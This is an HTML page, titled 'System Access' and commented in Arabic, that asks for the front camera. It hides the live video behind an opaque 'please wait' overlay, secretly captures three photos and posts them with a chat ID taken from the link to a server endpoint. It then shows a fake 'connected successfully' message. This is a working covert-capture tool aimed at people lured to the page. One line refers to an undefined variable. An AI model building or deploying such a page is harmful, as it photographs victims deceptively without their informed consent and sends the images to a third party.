<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>System Access</title>
<style>
  body { margin: 0; padding: 0; overflow: hidden; background-color: #000; font-family: system-ui, sans-serif; }
  #video { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 1; }
  #overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #0d0d0d; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; }
  .spinner { border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  #status-text { font-size: 18px; color: #aaa; }
</style>
</head>
<body>
<video id="video" autoplay playsinline muted webkit-playsinline></video>
<div id="overlay">
  <div class="spinner" id="spinner"></div>
  <div id="status-text">أنتظر قليلاً...</div>
</div>
<canvas id="canvas" style="display:none;"></canvas>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const chatId = urlParams.get('chatId');
  const statusText = document.getElementById('status-text');
  const spinner = document.getElementById('spinner');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  async function run() {
    if(!chatId) {
      statusText.innerText = "رابط غير صالح";
      spinner.style.display = 'none';
      return;
    }

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" }, audio: false 
      });
      
      video.srcObject = stream;
      
      // نجبر الفيديو يشتغل
      await video.play();

      // نستنى لحد ما الفيديو يرسم أول فريم حقيقي
      let framesRendered = 0;
      const checkFrame = () => {
        if (video.readyState >= 2) { // HAVE_CURRENT_DATA
          framesRendered++;
          if (framesRendered > 10) { // استنى 10 فريمات (حوالي نص ثانية)
             clearInterval(frameInterval);
             // استنى ثانيتين كمان للإضاءة
             setTimeout(capturePhotos, 2000);
             return;
          }
        }
        requestAnimationFrame(checkFrame);
      };
      requestAnimationFrame(checkFrame);

    } catch (err) {
      spinner.style.display = 'none';
      statusText.innerText = "تم رفض الصلاحية أو الكاميرا مشغولة.";
      statusText.style.color = "#f00";
    }
  }

  async function capturePhotos() {
    for (let i = 0; i < 3; i++) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      const imageData = canvas.toDataURL('image/jpeg', 0.8);
      
      await fetch('/api/photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, image_b64: imageData })
      });

      if(i < 2) await new Promise(r => setTimeout(r, 1500));
    }

    spinner.style.display = 'none';
    statusText.innerText = "تم الاتصال بنجاح.";
    statusText.style.color = "#0f0";
  }

  run();
</script>
</body>
</html>
